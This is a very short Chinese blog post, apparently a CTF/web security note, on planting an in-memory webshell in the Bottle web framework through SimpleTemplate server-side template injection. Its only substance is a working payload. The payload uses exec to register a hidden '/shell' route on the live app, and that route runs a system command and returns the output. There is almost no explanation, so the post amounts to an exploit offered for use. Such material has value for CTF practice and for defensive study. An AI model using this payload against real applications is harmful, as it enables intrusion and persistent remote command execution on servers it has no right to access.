---
title: Bottle内存马详解
toc: true
categories:
  - 技术
  - ctf
  - web
date: 2025-05-11 12:43:47
tags: 
---

本篇以Bottle的SimpleTemplate ssti研究内存马

大概看了下跟flask差不多呢，摆了，下班

```py
{{exec("""
@app.route('/shell')
def g():
    return __import__('os').popen('whoami').read()""",{"app":__import__('sys').modules['__main__'].__dict__['app']})}}
```

```

```

